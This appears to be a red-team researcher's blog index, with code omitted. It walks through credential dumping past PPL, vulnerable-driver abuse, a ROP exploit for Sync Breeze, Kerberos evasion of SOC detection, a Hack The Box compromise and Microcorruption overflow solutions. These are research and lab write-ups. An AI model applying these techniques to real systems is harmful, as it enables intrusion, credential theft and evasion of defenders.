[[{"l":"About","p":["Red Teamer | Vuln Researcher Passionate about Windows binary exploitation.","Interested in:","EDR evasion and bypasses","Active Directory exploitation","Driver reversing and exploitation","Currently looking at:","Windows Userland Binary Exploitation","Abusing DFIR tooling to get around mitigations"]}],[{"l":"LARPing as a DFIR Developer Part 1"},{"l":"Outline","p":["I was looking into dumping the swap file (and other system locked files) and wanted a way that would be hard to signature and isnt blocked by AV / EDR. I found out you can just dump the MFT from the physical drive and parse out the files you need. (Similar to parsing out lsass secrets from ram). This doesnt seem to be used by the 2 DFIR tools reversed but I'm sure it is a known technique."]},{"l":"Intro","p":["With Windows 10 fast approaching EoL I thought I should finally look into whatever this Windows 11 thing is and if there are any additional security features. A bit late I know but better late then never. While looking at the enabled by default settings I found out that both bitlocker and Protected Process Light (PPL) for lsass are enabled, which i found interesting as this should kill most dumping primitives as you can no longer get a valid handle to the process.","This is nothing new as PPL has been around since Windows 8.1 (A long time ago) and there has been a heap of research around exploits and bypasses but thinking about PPL its basically an ACL on the process handles. So instead of trying to access the memory via its mapped Virtual memory in the process, why not just dump all of the physical memory and parse it out that way. This works as all currently used virtual memory is mapped directly to RAM and can be translated by the kernel.","Again this is nothing new and is known trade craft (it even has its own MITRE ATT&CK code for all you purple team people out there. Most tools will use a driver and simply dump out all the ram to a file on disk. Then you can use volatility3 to extract the LSA secrets.","(You could also extract lsass.exe and then dump that with mimikatz on a remote host.)","This is pretty effective and opsec safe as this is a normal thing that DFIR people will do when they need to capture the contents of a machine. You can also use this a primitive to dump files, such as the SAM SYSTEM and SECURITY hives, but what if a page is swapped out to disk?"]},{"l":"Windows Memory Management","p":["Sometimes when I've gone to extract secrets from memory the tool has complained that the file cant be found or that it needs a swap file. First what even is a swap file?","A swap file is basically a file on disk that is the overflow of you ram. So if there is a unit of memory (a page - normally 4kb in size) that has not been accessed in a while, the kernel will swap the page out to the swap file allowing for more free memory to be accessed and allocated. The way this is implemented is pretty cool too. Let's say you have a program called notmalware.exe that doesnt run malware and instead allocates 12mb of random binary data and sleeps for 40minutes. If this was to run at system boot by the time you are going to use the 12mb of data the machine has probably launched a browser with 100 tabs, slack and teams. This will result in a chance that the pages have been swapped to disk. When the process will access the virtual memory the kernel will convert the virtual memory address to a physical memory location and check the first bit of the pointer. If this is set then it is in the swap file and instead will cast the pointer to an offset and swap the page back into ram. So lets just grab the swap file and let vol.py do all the work."]},{"l":"System locked Files","p":["So like every good developer I asked ChatGPT: Prompt:","Reply:","Code:","Well that sounds annoying but going to try anyways.","My first thought was lets just disable the swap file, While you can do this and it would fix all your issues you need a reboot and what if the computer reboots once every couple of years instead of on demand. My second thought was there has to be a driver for this. Then I thought if DFIR tools can do it why cant I? So i started to look into reversing and understanding forensics tools.","There is a git repo that lets you pick which tool to use: https://github.com/LETHAL-FORENSICS/Collect-MemoryDump/blob/main/Collect-MemoryDump.ps1 It also has a flag to dump the pagefile. Quickly analysing the Magnet RESPONSE binary shows that it does not call a driver and instead seems to open the physical drive.","This concept makes sense as its basically the same as the PPL bypass described above but for files. The system has a lock on a sector (the file equivalent of a page) and is filtering the access control. So instead of trying to access the sector via the implementation, NTFS in this case (For PPL it was Virtual Memory) lets grab the physical drive and carve out the file. Unlike RAM we cant write the entire disk to disk as we will run out of space, I also dont really want to have to wait to exfiltrate the entire disk. Instead we can just grab what we need and write that to disk (Just for the POC, ideally you would want to encrypt this and use it or send it via a c2 channel)."]},{"l":"NTFS","p":["How does NTFS work? I have no idea, but i do know of this magical file called the Master File Table (MFT) that should contain all the files in some sort of table that we can loop over till we find the one we want.","Prompt:","Code:","Running the code","I guess we also have to parse out the MFT too. :(","I found this article that seems to be doing just that, instead of trying to badly explain it I suggest you just read it yourself: https://handmade.network/forums/articles/t/7002-tutorial_parsing_the_mft","The best thing is that they provided a full code sample at the end :) Compiling and running the code shows that it indeed does work and is able to get the FILE attribute of the pageflie.sys file from the MFT. (much better then what chatgpt has done so far.)","With this code we can modify it to check if the $FILE name attribute is the one we are looking for then get the file data. As the swapfile will be bigger then 4kb it will be a Nonresident file so we can grab the dataruns.","Running the modified code will show the sectors that the file is mapped too.","All that is left to do is write the file to disk. (full code on github: https://github.com/ElJayRight/dumping_disk_poc). There is a risk of the swap file being updated after you have read the sectors but I couldnt find a way to get around this as it seems to be a race condition by design. All the forensics tools I could find that do this just say to dump the swap file right after a memory dump.","My only advice would be to allocate all the space you need on the heap with VirtualAlloc before you dump ram and make sure the ram dumping tool isnt not over allocating memory when writing to a disk."]},{"l":"Closing Thoughts","p":["My current thoughts are why not just do everything dynamically in memory, to decrypt lsa secrets you need to access the registry hives anyways, so why just parse out the lsa secrets in memory and resolve the pointers to the swap file as you need them. This would result in just needing to exfil the decrypted secrets which is a lot easier then 16Gb of memory."]}],[{"l":"Making Linux Kerberos Tickets Not Bad"},{"l":"Outline","p":["Small post about making kerberos ticket better from linux. Mainly focusing on opsec considerations and how to blend into normal traffic. Also going to modify an impacket script and write my own. I wont be covering the basics of kerberos or ADCS as its been done 100 times by people a lot better at writing blogs than I am (most of the stuff here will be covered in the links below):","Kerberos: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html","For those that dont like reading: https://www.youtube.com/watch?v=byykEId3FUs&ab_channel=scrt.insomnihack","Things I’m going to cover.","Ticket flow when using impacket (and how to make it not sus)","Multiple tickets in one ccache file"]},{"l":"Ticket Flow When Using Impacket","p":["So lets say you have a high privileged account in AD, Domain admin or a service account running as a DA or something. So you start to run psexec to login to boxes and grab stuff, secretsdump to dump hashes from the domain, creating a user account as a domain admin to flex in the report. What does impacket actually do when you do this?","Quick assumptions - You have the plain text pwd, ntlm hash and aes256 key (random but it’ll be used later)","Every time you run a script specifying kerberos and passing in a TGT impacket with use this TGT to request a TGS, for wmiexec it will request a CIFS ticket, then a HOST ticket four times. This is because impacket is not saving the ticket in memory and requesting a new one everytime.","This is strange in the context of a normal user doing normal user stuff, as in windows the tickets would be stored within the LUID. So the first time a TGT is requested it will be saved and used to request a TGS which will be also be saved in the LUID. When connecting to the service Windows will provide all the needed TGS tickets (or create new ones by providing the TGT). To mimic this on Linux we have to first request a TGT then request the TGS tickets and save them all to one file."]},{"l":"Multiple Tickets In One Ccache File.","p":["You will soon come to realise that this is harder then it seems. If you request a CIFS ticket then pass that it makes it a bit better, but will instead change the SPN of the CIFS ticket to be a HOST ticket and use that in memory. (It will also request it multiple times). Requesting the CIFS ticket from the TGT, and validating it:","Then using this ticket for wmiexec.py:","This is a bit better, but still weird from the logs. As it would show that the user requested a TGT then a CIFS TGS then authenticated with a HOST ticket, that just appeared out of nowhere. Will a SOC be monitoring this? maybe idk I’m not a SOC Analyst, but if they are lets get rid of that and do it properly.","One possible way around this is to request the HOST ticket but not use it in the ccache. This will stop the “It appeared out of nowhere” detection chance, but I still don’t like it as the ticket generation time will be different. I want to give the SOC absolutely nothing to detect on. :D","Lets dive into the ccache structure and see if we can inject a second TGS.","https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html","credentials, plural meaning multiple. (please dont be a typo) So it is doable!","Going back to the structure of a TGS it will have a bunch of header stuff and then the actual TGS as shown here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication","The structure will be: Username, Session Key encrypted stuff then TGS. So if we can extract out just the TGS and slap it onto the end of the ccache file it should be fine?","So how do we find the length of this header vaule?","I used impacket’s ccache.py file cause that seemed like a good place to start, and checked the length of the ticket before and after the header is passed out. For both the TGT and CIFS tickets the difference is 60 (This will change based on the length of the SPN and client).","So cutting off the first 60bytes and pray for the best.","Lol it worked."]},{"l":"mergeTicket.py","p":["Time to write an impacket script to merge tickets for us! (I dont think this has already been done)","To start with I’m going to pass in 2 tickets and check if the spn is different, username is the same and if its for the same server.","Next is to just merge the tickets. I’m going to use the crude way of just reading in 60 bytes then writing it out to a file.","Nice! it works.","Now to update the script to work for any number of tickets.","And proof it works:","Here is the script if you want to laugh at my python code (or use the script): https://github.com/ElJayRight/impacket/blob/master/examples/mergeTicket.py","A final show of the new workflow with the new script:","Request a TGT:","Request LDAP, HOST and CIFS tickets","Merge the tickets.","Then run secretsdump (ldap) and wmiexec (cifs and host):","It works!!"]},{"l":"Fin","p":["So I didnt end up modifing an impacket script, so thats to come soon. I’m planning on updating getST to allow for both multiple SPNs and to save to a single file. There are still other opsec things to consider that I didnt mention. I’ll probs cover these in the second post."]}],[{"l":"Parsing PE Headers"},{"l":"Outline","p":["This was going to be one post but it got kinda long so here is part one. I'm getting really annoyed of having to look up offsets and recompile driver exploits for different OS's and thought surely there is a way that this can be done automagically at execution time. My first thought was \"well if windbg knows the size of a structure then why cant i?\" (Parsing the actual PDB will be in part 2)"]},{"l":"Windbg and PDB files","p":["How i normally go about finding offsets is by creating a VM with the same major version of the OS i am targeting (for all the code snippets it will be Windows 11 24H2.), hooking up a debugger and dumping the structure:","Then hard coding it in for the exploit:","While this works it absolutely sucks to do every single time. So instead I started to look into how windbg knows which Program DataBase (PDB) to pull from microsoft and use within windbg. Quickly dumping out the headers showed that the pdb string is represented as a GUID within the debug directories of the files (This wont be the case for all PEs as some dont have public symbols).","I dont know what the other 2 are so im going to forget about them and just focus on the cv one.","You can also do this in windbg:","Once you have the GUID and the pdb filename you can download the file from microsofts symbols store:"]},{"l":"PE Headers","p":["While this is cool ideally i want to be able to do this with just a file handle so i can later turn it into a Beacon Object File (BOF). Which finally lead me to the PE headers. After reading https://learn.microsoft.com/en-us/windows/win32/debug/pe-format a few times and reading a few other posts we need to read the DOS header which will have a pointer to the NT headers. The NT headers will have section headers and then we can finally read out the debug directory entries.","We can check if the DOS header and NT header are valid before hand too.","Next is to read the section headers and get the debug directory entries.","Running the above against ntoskrnl shows the exact same thing as dumpbin.","Finally we can check if the debug type ( https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#debug-type) and then dump out the buffer which should be the pdb and follow this structure. ( https://www.debuginfo.com/articles/debuginfomatch.html)","We can also check if the signature matches \"RSDS\".","which results in:",": D","Final step is to download the file and check the checksum against the one that windbg uses.","TaDa!","Full code: https://github.com/ElJayRight/code_from_blog_posts/tree/main/parse_pe_headers"]},{"l":"Closing Thoughts","p":["While this will work for most files, it wont be able to handle a PE32 or if the pdb is the old PDB2.0 format. I'll fix these issues if they ever come up while using the tool. With the end goal of using this as a BOF i didnt really see any need to update the code to have the ability to download the pdb file. (tbh i havent fleshed out the full project yet lol).","Next post I'll look at what a pdb file is and how do i parse one on linux."]},{"l":"References","p":["https://stackoverflow.com/questions/3899573/what-is-a-pdb-file","https://www.debuginfo.com/articles/debuginfomatch.html","https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#debug-type","https://stackoverflow.com/questions/3092609/how-to-get-field-names-and-offsets-of-a-struct-using-dbghlp-and-pdb"]}],[{"l":"Sync Breeze Enterprise v10.4.18"},{"l":"Outline","p":["I'm going to start a series on exploiting a few older Windows applications to get a stronger understanding of how to create more sophisticated exploits using modern techniques. To start with I've chosen Sync Breeze Enterprise v10.4.18 as OJ Reeves did an amazing stream a few years back covering how to exploit this which I highly recommend watching. (link here https://www.youtube.com/watch?v=jta5z4FZagM).","Instead of blindly copying his rop gadget I'm going to create a chain for VirtualAlloc, instead of VirtualProtect. At first I wanted to use a different dll but due to bad bytes that isnt easily doable.","DISCLAIMER: I'm going to make a lot of mistakes, instead of editing them out, I'm just going to document them and correct them later on. This should be treated more as how I approach writing an exploit rather then a precise methodology of how to craft an exploit. With this in mind I will try to explain my reasoning for why I am doing each step. To try to this post from being way to long I'm going to get less verbose as I go along, as most of this will be following similar steps to before."]},{"l":"Check Page Permissions","p":["Code to trigger the crash","Running the application in windbg and then triggering the crash shows:","As this is an SEH exploit we should look at the exception handler chain.","This shows that the next SEH handler is 0x44444444 or DDDD which is something we control! To figure out where to go from here we should check the page permissions of the stack if it is RWX we can do a pop pop ret; and point the SEH handler to a location on the stack and execute our shell code. If it is not executable (NX / DEP enabled) then we will have to use ROP."]},{"l":"Stack Pivot","p":["When an expection handler is called, the esp register shall be decremented by a fair bit from where the top of our payload is. To fix this we need to put a gadget in the SEH address (currently populated with DDDD) that will add esp offset; ret and return esp back to where our shellcode is.","To find the offset, we need esp when the exception is getting handled and the location of the top of our buffer.","At the time of the exception: 0x02d1f560 and the top of the buffer is at 0x02d1fa10","Meaning we need a jump close to 0x4b0","To find this we can use ropper to generate all the possible rop gadgets.","This is as close as I could I could get. Updating the script as follows the recrashing the application:","Setting a breakpoint and running the application","This shows a few things, the first being that we need to include a ropnop at 0x02cbfa48 instead of AAAA, and that we now control esp!","Instead of doing a ropnop it would be a good idea to realign the stack. So we need a gadget that will inc esp by 2 + 4N","I'm also going to update the script to land esp at BBBB instead of CCCC","Looking at the stack layout:","We are going to need to pivot over 10039F9E anyways so may as well do it with the stack alignment resulting in a realignment of 0x28","off by 0xc:/","updated code","Now we dont need to worry about stack pivoting anymore."]},{"l":"Virtual Alloc Stack Frame","p":["As shown before the stack is currently NX so we can use something like VirtualProtect or VirtualAlloc to change the page permissions to RWX and execute shellcode on the stack. To do this we need to create a stack frame for VirtualAlloc and then call a pointer to VirtualAlloc to execute the function. The easiest way to do this is with the pushad; ret; opcodes. What this will do is push a bunch of registers to the stack:","So if we can get the right values in each register then call pushad it will create the stack frame.","Looking at MSDN VirtualAlloc needs these parameters:","For these we can set the following static values:","Following the calling convention we need the registers to be set up as follows:","Now the joys of setting this up :D"]},{"l":"IAT Hopping","p":["For lols","In the stream, OJ did IAT hopping, and it was super cool, so I'm going to do it too.","The basic premise is to get the address of a KERNEL32 pointer from libspp.dll and then find a offset in KERNEL32 to KERNELBASE!VirtualAlloc","To find a pointer in libspp.dll we can dump the import address table for libspp.dll:","Going to use:","Now to find the offset to KERNELBASE!VirtualProtect(same method as above but for kernel32 instead of libspp.dll)","So we need an offset of 0x77411594 - 0x773b3760 = 0x05DE34","So the chain we need is","I couldnt find a mov esi, dword ptr [esi]; ret; but found one for eax instead, so changing the rop chain to look like this:","The above is super close, the only issue is 0x05de34 will be padded to include a null byte. Instead of add eax, ebp we could do sub eax, ebp and have ebp be a negative so it is basically the same.","That should be the final chain!","After adding it to python and re crashing the app. Running this I got one thing wrong, there should be a pop pop ret in edi not a ret","Giving the final chain of:"]},{"l":"Setting the rest of the registers"},{"l":"EAX","p":["easy"]},{"l":"EBP","p":["It's the same as a jmp esp;"]},{"l":"EDI"},{"l":"EBX"},{"l":"ECX","p":["As we cant just directly pop 0x40 into the register I found a chain that will increment it by 0x10."]},{"l":"EDX","p":["This was annoying to set up, but it was easy once I found the mov edx, eax; sar edx, 8; gadget."]},{"l":"Reorder gadgets","p":["The edx, ecx and esi chains are messy so there is a high chance they will break previously set registers.","ecx breaks: eax edx breaks: ecx, eax esi breaks: eax, ebp, edi, esi, ebx","So the order should be:","Giving the final rop chain of:","Running this and setting a breakpoint at the end, and it errors."]},{"l":"Debugging","p":["...","ahhh cause I'm doing a call there needs to be a PPR.","And this works!!!","As it will get shifted to 0x00000FFF then incremented to 0x00001000","EBX destroied ECX:","First thing is that it inc needs to come after the sar","I think this is right:","It should be 1 as its 3 for the 0xc and 8 are taken by the PPR.","Oh the addr_saredx gadget is wrong. It should be:","SHELL!!","So close, the edx sar starting value is off. I think it should be:","So turns out a lot was wrong. I single stepped and changed a few things, it now looks like this:","The inc also needs to be on edx","The ret 0xc is going to be annoying.","This breaks eax, which is fine as we already did that before.","This didnt work, forgot to loop ecx 4 times, and ebp needs to have a pop ebp at the start. Also going to add a pushad; ret; and some nops to the end of the payload, as its getting super close.","This is weird as the gadget shouldnt do that. The gadget chain was wrong so going to rewrite it:","This should be it.","This will break the eax register as the al register is the lower 8-bits. Updating the rop chain and trying again.","Trying again","Trying again. Sam exception handler.","Which means shell time!"]},{"l":"Fin","p":["That derailed kinda quickly, towards the end I left out most of the debugging issues, as it was just me doing dumb stuff and not mathing right.","Surely there are better ways to optimise this and maybe use better gadgets, so I might revisit this later.","Full script is on github: https://github.com/ElJayRight/pocscripts/blob/main/sploit.py"]}],[{"l":"CapCom.sys Exploitation"},{"l":"Outline","p":["A shorter post on reversing and exploiting the capcom.sys driver as a gentle introduction into the world of windows driver exploitation."]},{"l":"Reversing the Driver","p":["The first thing to look at is the drivers device name. This is normally in the DriverEntry function and will be parsed as the second parameter to the IoCreateSymbolicLink function.","Looking at the disassembly in IDA we can see the call to IoCreateSymbolicLink:","Above it there is a call to sub_103AC which seems to be doing some sort weird byte magic, So instead of dealing with all that. I'm going to load the driver using OSRLoader and then finding the drivername at runtime.","In a kernel debugger hooked up to the target we can add the following breakpoints:","then loading and running the driver we will see that it hits our breakpoints:","Then checking the value at rdx:","So this the drivers device name.","Looking around more there is a weird looking function:","As it disabled smep -> runs command -> enables smep it's super interesting. So how do we get to here?"]},{"l":"Calling the vulnerable IOCTL","p":["looking at the calling function it seems to be checking against this IOCTL: 0x0AA013044. So lets create a quick POC that will call it and pass in a bunch of junk so we can debug the driver as it is processing the ioctl.","There are a bunch of different ways of loading a driver, I'm going to use OSRLoader for now as its the quickest","Calling the IOCTL is straight forward we can use CreateFile to get a handle to the driver and DeviceIoControl to issue the call","Setting a breakpoint on the dispatch handler (capcom+0x590) and running the code:","After running the above we can see that rdi is a pointer to our data.","Next we can find the input and output buffer sizes:","Next we can see the compare for the targeted ioctl:","Finally we have a check we dont pass:"]},{"l":"Calling the right code path","p":["This seems to be checking that the size of the data we pass in is equal to 8 bytes.","Sending only 8 bytes and getting back to where we were up to and get to another check, this time on the output buffer:","Modifying the code again to pass the check:","Next we see a very interesting operation:","The above sets rcx to be our data and then bluescreens :D.","If we check the disassembly again:","We can see that the 8 bytes before our buffer have to point to the buffer. We can use some pointer magic to do this:","Then rerunning shows that we are executing the bytes at rcx / our input buffer:","Instead of getting popping calc or getting shells I'm going to stop as I'm planning on covering all that in a later blog in detail."]},{"l":"Code POC"}],[{"l":"Disabling PPL with a LOLDriver"},{"l":"Outline","p":["As I keep looking into this windows 11 thing I wanted to have a go at disabling PPL by using a LOLDriver as that seems to be a thing APTs are doing. Also going to see if there are any difference to the general windows 10 kernel exploitation setup functions."]},{"l":"The issue","p":["What is PPL and why is it annoying? A while ago windows thought it would be a good idea to implement some form of access control around process handles and implemented Protected Process. With this came 3 Protection levels; Protected Process, Protected Process Light (PPL) and none. When a process requests a handle to a different process the kernel will check what level each process is and will only grant access if the process is of equal level or higher. So a PPL process can access a none process and a PPL process but not a Protected Process.","So why not just create a process with the level Protected Process and call it a day? To do this the process has to be signed by Microsoft and pass a few other checks.","So instead of trying to target this from userland, why dont we look at it from the kernel. Enter LOLDrivers.","Living Of the Land Drivers (LOLDrivers) are (normally) thrid party drivers that contain a vulnerability or abusable feature allowing for kernel primitives, such as a read and/or write. These drivers are also signed allowing to load them with sc.exe.","There is a project which has a heap of them to use: https://www.loldrivers.io/(most are blocked by default but maybe one or two are not :) )","Just like most things related to process the Protection level can be found within the EPROCESS structure under _PS_PROTECTION Looking at the structures in windbg we can verify this and get the offsets.","Lets check the levels of 2 process, a random cmd.exe spawned by a non admin user and lsass.exe","Looking into the Type and Signer field for the structure gives us a bit more information:","So lsass would be a PPL process signed with lsa. With the above in mind if we are able to change the memory for cmd.exe to be the same as lsass we would be able to get access to the process."]},{"l":"How to weaponise a driver","p":["For this we need to find an arbitrary write primitive in a driver with a valid signature that we can abuse. Picking a random driver from loldrivers (link) i picked wnbios.sys. It is being used in the RealBlindingEDR so we can use the same ioctl to get an arb read and write. (weaponising a driver is sorta just a side point right now.)","Super quick overview of how drivers work.","To talk to drivers you use IOCTLs which take input run a code path in the kernel and sometimes give output. If an IOCTL does not verify the data that is being passed into it you might be able to get powerful kernel primitives."]},{"l":"Weaponising the driver","p":["Looking at the source code we can copy the read and write primitives (I'm to lazy to find and then burn a driver Nday for a blog :D ):","Unlike windbg we are not able to find the eprocess of random processes instead we have to traverse them via the ActiveProcessLinks element of the EProcess structure. We can then check the PID to make sure it is the right process:","We can use NtQuerySystemInformation to get the base of the eprocess structure for the kernel then iterate from there using the read primitive.","Before that, a quick note: Since windows 11 24H2 NtQuerySystemInformation will no longer return a kernel pointer unless the process is running with SeDebugPrivilege enabled. https://windows-internals.com/kaslr-leaks-restriction/","So let's also add that. (As this already assumes you are admin)","Kernel leak:","Then the loop to find the eprocess for our PID.","We can run this with a debugger hooked up to check if the read and offsets are correct.","Now we can read the 8 bytes which will include the protection level and update the process to be the same level as lsass.exe","Output:","TaDa! From here you can load mimikatz in the process or do do whatever you need to do. You could also just set Lsass.exe to have a protection level of 0.","Full code: https://github.com/ElJayRight/Driver_Exploits/tree/main/Disable_PPL"]},{"l":"Closing Thoughts","p":["As always this is just one way of modifying PPL. You could also target the Driver signing enforcement structure and null that out and load your own driver which disables PPL. Another idea would be to just copy the process token of lsass and spawn a mimikatz that way. The offset is _EPROCESS is:"]},{"l":"Resources used while researching this stuff","p":["https://support.kaspersky.com/common/windows/13905#:~:text=Protected%20Process%20Light%20(PPL)%20technology%20is%20used%20for%20controlling%20and,Stream%20deployment","https://www.crowdstrike.com/en-us/blog/evolution-protected-processes-part-1-pass-hash-mitigations-windows-81/","https://web.archive.org/web/20200405151003/https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/","https://web.archive.org/web/20200326050008/http://deniable.org/windows/windows-callbacks","https://windows-internals.com/kaslr-leaks-restriction/","https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/","https://github.com/myzxcg/RealBlindingEDR/tree/main"]}],[{"l":"Token Stealing via Physical Memory"},{"l":"Outline","p":["I saw this really cool blog post a while ago about abusing a physical memory read / write by converting the address to a virtual one and thought it would be cool to \"borrow\" and improve on a bit. I highly recommend you read the original blog post: https://xacone.github.io/eneio-driver.html before reading my ramblings. Instead of rehashing everything covered in the original blog I'm going to talk about how I approached weaponising the driver and slightly touch on how token stealing works."]},{"l":"High Level Recap","p":["(In case you didn't read the blog post ...) On windows 11 there is a function called nt!HalpLMStub which is 0x30 bytes before the cr3 value and is always at a physical address between 0x10000 and 0x20000. When we get the cr3 value we can easily convert virtual address to physical. (Also recommend reading https://connormcgarr.github.io/paging/ If you don't have a solid understanding of windows paging.) From here they went on to leak out the KTHREAD and the values from the kernel's big pool. Here's where i decided to take a different path."]},{"l":"Token Stealing","p":["While stealing the system token was my logical next thought I decided to leak out the system EProcess token using NtQuerySystemInformation and walking the ActiveProcessLinks to find the token of the current process. To do this we need 3 things from a EProcess's structure, its PID, ActiveProcessLinks. First we can dump out the system token and a normal process's token in windbg and see the differences.","As we can see the token structure has the bottom 3 bits set as a reference counter, so to use the value we will have to mask them off. Implementing this we can walk forward one EPROCESS then check the PID.","Finding the offsets.","Hard coding the offsets.","I thought I would also check if the host is windows 11 24H2 or greater and check if we are running in high integrity before calling the driver and trying to get a KASLR leak.","Full code can be found here: https://github.com/ElJayRight/Driver_Exploits/blob/main/eneio64/main.c"]},{"l":"Closing thoughts","p":["So yeah super quick writeup, I didnt really want to rehash someone else's writeup and thought it would be cool to poc a physical memory abuse driver. I'm planning on using this driver in a bigger project soonish.","I thought about adding a ring buffer so I didnt have to map all the memory in one go, however I was too lazy to want to reimplement the virtualtophysical function so decided against it. Maybe in the future."]}],[{"l":"Anubis","p":["Fun AD box, starts with Template Injection which leads to landing in a docker container. From here there is a pivot to an internal web app which can be manipulated to leak a users NTLMv2 hash. This hash cracks and the user can authenticate to SMB where there is a vulnerable version of Jamovi running which allows for a XSS to RCE CVE. The final step is abusing ESC4 to get Administrator on the box."]},{"l":"Enumeration"},{"l":"Nmap","p":["dns name:"]},{"l":"SMB","p":["domain name and hostname."]},{"l":"HTTPS","p":["Some people which could be mapped to usernames:","reflected content on the submit form.","Trying ssti and it errors!"]},{"l":"Foothold - Template Injection","p":["As its an asp page I'm going to try vbs","This works and shows that we are running as system. Checking this hostname against what we got from netexec.","This outputs as webserver01 so its probs a container or something.","Going to use a tcp one liner to get a reverse shell. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1","Hosting the file locally then downloading it with an iex cradle.","This gives us a shell !"]},{"l":"Foothold - Enumeration","p":["On The administrators desktop there is a certificate","Analysing the cert with openssl shows another hostname:","Running nslookup on the host shows it resolves to 172.22.96.1, which is the gateway (again showing this is a docker container).","Next step is to drop chisel and set up a pivot.","chisel on the attack machine:","chisel on the windows box:"]},{"l":"Internal WebApp","p":["quick port scan shows that smb and http are open:","curling the website shows that there is an install.asp page that expects an ip.","Going to start responder and then send a request with the ip pointing to my machine. This works and gives back a hash:","This cracks with hashcat to give Secret123. Using this we can now enumerate smb.","There is the CertEnroll share which means ADCS is installed which means certipy."]},{"l":"ADCS Enumeration","p":["There is a template for web where the webdevelopers have write propery over the certificate, meaning we can modify the cert to allow user authentication. As it already has EnrolleeSuppliesSubject we can specify any user.","Going to dump ldap to see what users are in the webdevelopers group.","So we need to get to the Diego Cruz user."]},{"l":"Jamovi XSS CVE","p":["Going back to smb and checking the shared folder, there is a file called Whatif.omv that seems to be being updated.","Downloading and unzipping the file shows that the file is created by jamovi 1.6.16.0 which has a xss to rce CVE: https://github.com/g33xter/CVE-2021-28079","Running the exploit gives us a shell as diegocruz. :D"]},{"l":"ESC4","p":["As we are now a member of the webdevelopers group we can modify the template to allow for user auth. For this I'm going to use this script: https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1 which converts a template into the format needed to request a smartcard cert (pfx).","We can check this worked by running certify on the box:","Final step is to request the cert, get a tgt then psexec in:","root.txt:"]},{"l":"Things to learn / look into","p":["How to request a cert for the current user on windows, this means I wouldnt have to drop certify on the box to request the cert.","VBS revshell - instead of calling out to a ps1 file and executing it with CreateObject(WScript.Shell).exec(). This would also give me greater control over the process running my revshell.","I'm probs going to do the box again soonish with the above stuff included as it would make it more fun and challenging."]}],[{"l":"0. Outline"},{"l":"What Are These?","p":["Writeups (in the loosest term possible) for the microcorruption challenges. ( https://microcorruption.com/)","The first few levels are pretty easy so instead of a writeup I wrote down the way I approached each challenge. For the later ones I'm planning on doing full CTF style writeup."]},{"l":"Solutions","p":["New Orleans","Sydney","Hanoi","Cusco","Reykjavik","Whitehorse","Montevideo","Johannesburg","Santa Cruz","Jakarta"]}],[{"l":"1. New Orleans"},{"l":"Challenge Overview","p":["When running the module it asks for a password:"]},{"l":"Solution","p":["Looking at the disassembly:","We can see that there is a check against @r13 and 0x2400. Setting a breakpoint and inspecting the memory:","r13 is our input. Swapping this to the expected value of Cc^3@P' and removing the breakpoint.","Nice warmup to learn the env and how the asm works."]}],[{"l":"2. Sydney"},{"l":"Challenge Overview"},{"l":"Solution","p":["Looking at the assembly:","Setting a breakpoint at the start of check_password","So inputting the bytes 47605d3e71406b70 as the password should work:"]}],[{"l":"3. Hanoi"},{"l":"Challenge Overview","p":["running the application"]},{"l":"Solution","p":["Looking at the disassembly shows something interesting:","There is a check 0x10 bytes after our user input. Setting a breakpoint and testing for an overflow in out input: 41*0x10+0xce","Solves the challenge.","Bufferoverflows <3"]}],[{"l":"4. Cusco"},{"l":"Challenge Overview","p":["Running the program:"]},{"l":"Solution","p":["Looking at the assembly:","It seems the the saved return pointer will be directly after our buffer (shown at 0x453a). Checking for an overflow and setting it to the unlock_door function (0x4446)`0x41* 0x10 + 0x4644","The output is still the same but it unlocks the lock due to unlock_door being called.","Nice SRP overwrite."]}],[{"l":"5. Reykjavik"},{"l":"Challenge Overview","p":["Running the program:"]},{"l":"Solution","p":["Looking at the main function:","It looks like enc is decoding a block of memory and then calling it at 0x2400","Setting a breakpoint on the call and dumping memory:","assembling with the provided assembler ( https://microcorruption.com/assembler) and single stepping shows a check against our input:","changing the input to be 8929 works.","Nice challenge around dynamic debugging instead of static."]}],[{"l":"6. Whitehorse"},{"l":"Challenge Overview","p":["Running the program"]},{"l":"Solution","p":["Looking at the assembly:","This is very similar to Cusco but instead of jumping to the function and passing 0x7f into the INT call we have to write the shellcode ourselves and jump to it.","| shellcode | padding | start_of_shellcode |","and the buffer is written to 0x327e.","This works!","Fun little challenge on writing basic shellcode."]}],[{"l":"7. Montevideo"},{"l":"Challenge Overview"},{"l":"Solution","p":["This challenge is very similar to Whitehorse expect for the strcpy command which will end the string at 0x00 which means we cant use.","Instead we can create the value and put it in r15:","adding the padding and srp overwrite:","This works!","Nice intro to bad bytes."]}],[{"l":"8. Johannesburg"},{"l":"Challenge Overview"},{"l":"Solution","p":["Looking at the assembly it seems there is a static canary after the input buffer:","To get around this we can just add it to the buffer:","| padding | canary | srp |","So: 0x41*17+0x86 + 0x4644","trying this:","The works!","Nice intro to canaries."]}],[{"l":"9. Santa Cruz"},{"l":"Challenge Overview","p":["Running the program:"]},{"l":"Solution","p":["and due to the strcpy call I cant null out the byte.","fun challenge","Going to try the same idea but overflowing the username to past where the password buffer would be.","Instead what if we use the username to write the entire payload and then the password to write the null byte.","Looking at the assembly shows that its pretty different to the previous levels.","Looking at the layout of memory at the end of the function:","Looking at the memory again this value seems to be the 0x12 byte of the username:","Setting a breakpoint at each br #0x4440 __stop_progExec__ call and overflowing the password field.","Setting a breakpoint at the compare:","So it would be: username = 0x41*17 + 0x11 + 0x41*24 + 0x4a44 password = 0x41 * 0x11 + 0x00","This fails another check:","This shouldnt happen :)","trying 0x17 bytes for the password padding:","username = | padding | len(password) | padding | password = | padding | srp |","username = | padding | len(password) | padding | srp | password = | padding | 0x00 |","username = 0x41*17+0x19+0x4141 password = 0x41*23+0x4a44","With this we can now bypass the password length check.","yay this works!!"]}],[{"l":"10. Jakarta"},{"l":"Challenge Overview"},{"l":"Solution","p":["Looking at the login function","The username has a max length of 0x20","Looking at the manual shows that","will only check the lower byte of r15 so what if we were to enter a password of length 0xe0 causing the total to be 0x100 which will pass the check.","this works and passes both checks 